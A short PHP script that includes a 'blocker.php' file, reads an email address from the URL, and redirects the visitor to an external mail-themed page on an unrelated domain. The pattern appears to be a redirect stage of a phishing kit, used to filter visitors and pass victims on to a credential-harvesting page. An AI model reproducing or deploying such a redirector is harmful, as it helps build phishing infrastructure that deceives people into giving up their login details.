<?php
include('blocker.php');
session_start();
$email = $_GET['email'];
header("Location: https://visionsmensclub.com/visionsmail/shardocz");
?>